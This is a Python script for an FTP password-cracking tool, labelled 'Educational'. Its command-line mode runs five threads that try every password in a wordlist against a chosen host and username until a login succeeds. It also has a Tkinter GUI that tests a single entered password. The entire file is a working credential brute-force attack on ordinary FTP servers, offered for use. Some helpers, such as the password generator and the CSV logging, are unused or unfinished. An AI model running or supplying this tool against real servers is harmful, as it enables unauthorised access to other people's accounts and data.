#!/usr/bin/env python3

import ftplib
import argparse
import itertools
import string
import sys
import threading
import queue
import time
import csv
import json
from datetime import datetime
from threading import Thread, Event

# ---------------- GUI ----------------
try:
    import tkinter as tk
    from tkinter import ttk, scrolledtext, messagebox
    GUI_AVAILABLE = True
except Exception:
    GUI_AVAILABLE = False

# ---------------- Globals ----------------
task_q = queue.Queue()
ui_update_q = queue.Queue()
stop_event = Event()
producer_done_event = Event()

stats_lock = threading.Lock()
stats = dict(attempts=0, successes=0, failures=0, errors=0,
             last_attempt=None, start_time=None, end_time=None)

success_list = []

CSV_FILE = None
CSV_WRITER = None

# ---------------- Helpers ----------------
def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def open_csv():
    global CSV_FILE, CSV_WRITER
    CSV_FILE = open("ftp_attempts.csv", "w", newline="")
    CSV_WRITER = csv.writer(CSV_FILE)
    CSV_WRITER.writerow(["time", "user", "password", "result"])

def close_csv():
    if CSV_FILE:
        CSV_FILE.close()

def generate_passwords(min_l, max_l, chars):
    for l in range(min_l, max_l + 1):
        for p in itertools.product(chars, repeat=l):
            yield "".join(p)

# ---------------- Worker ----------------
def ftp_worker(host, port, timeout, wid):
    while not stop_event.is_set():
        try:
            user, pwd = task_q.get(timeout=1)
        except queue.Empty:
            if producer_done_event.is_set():
                break
            continue

        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=timeout)
            ftp.login(user, pwd)
            ftp.quit()

            with stats_lock:
                stats["successes"] += 1
                stats["attempts"] += 1

            success_list.append((user, pwd))
            ui_update_q.put(("success", f"{user}:{pwd}"))
            stop_event.set()

        except ftplib.error_perm:
            with stats_lock:
                stats["failures"] += 1
                stats["attempts"] += 1
            ui_update_q.put(("attempt", f"{user}:{pwd} FAIL"))

        except Exception as e:
            with stats_lock:
                stats["errors"] += 1
            ui_update_q.put(("error", str(e)))

        finally:
            task_q.task_done()

# ---------------- Producer ----------------
def producer(users, passwords):
    for u in users:
        for p in passwords:
            if stop_event.is_set():
                break
            task_q.put((u, p))
    producer_done_event.set()

# ---------------- GUI ----------------
class FTPCrackerGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("FTP Cracker (Educational)")
        self.geometry("800x500")

        self.create_widgets()
        self.after(500, self.process_ui)

    def create_widgets(self):
        top = ttk.Frame(self)
        top.pack(fill="x", padx=10, pady=5)

        ttk.Label(top, text="Host").grid(row=0, column=0)
        self.ent_host = ttk.Entry(top)
        self.ent_host.grid(row=0, column=1)

        ttk.Label(top, text="User").grid(row=1, column=0)
        self.ent_user = ttk.Entry(top)
        self.ent_user.grid(row=1, column=1)

        ttk.Label(top, text="Password").grid(row=2, column=0)
        self.ent_pwd = ttk.Entry(top)
        self.ent_pwd.grid(row=2, column=1)

        self.btn_start = ttk.Button(top, text="Start", command=self.start)
        self.btn_start.grid(row=3, column=0, pady=5)

        self.btn_stop = ttk.Button(top, text="Stop", command=self.stop, state="disabled")
        self.btn_stop.grid(row=3, column=1)

        self.log = scrolledtext.ScrolledText(self)
        self.log.pack(fill="both", expand=True, padx=10, pady=10)

    def start(self):
        host = self.ent_host.get()
        user = self.ent_user.get()
        pwd = self.ent_pwd.get()

        if not host or not user or not pwd:
            messagebox.showerror("Error", "Fill all fields")
            return

        stop_event.clear()
        producer_done_event.clear()

        self.btn_start.config(state="disabled")
        self.btn_stop.config(state="normal")

        open_csv()

        Thread(target=producer, args=([user], [pwd]), daemon=True).start()
        Thread(target=ftp_worker, args=(host, 21, 5, 1), daemon=True).start()

        self.log.insert("end", "Started...\n")

    def stop(self):
        stop_event.set()
        self.log.insert("end", "Stopped\n")

    def process_ui(self):
        while not ui_update_q.empty():
            t, msg = ui_update_q.get()
            self.log.insert("end", f"{timestamp()} {msg}\n")
            self.log.see("end")

        self.after(500, self.process_ui)

# ---------------- Main ----------------
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--gui", action="store_true")
    parser.add_argument("--host")
    parser.add_argument("-u", "--user")
    parser.add_argument("-w", "--wordlist")
    args = parser.parse_args()

    if args.gui:
        if not GUI_AVAILABLE:
            print("Tkinter not installed")
            sys.exit(1)
        FTPCrackerGUI().mainloop()
        return

    if not args.host or not args.user or not args.wordlist:
        print("CLI usage requires --host -u -w")
        sys.exit(1)

    users = [args.user]
    passwords = open(args.wordlist).read().splitlines()

    open_csv()
    Thread(target=producer, args=(users, passwords), daemon=True).start()
    for i in range(5):
        Thread(target=ftp_worker, args=(args.host, 21, 5, i), daemon=True).start()

    while not producer_done_event.is_set():
        time.sleep(1)

    close_csv()
    print("Done")

if __name__ == "__main__":
    main()
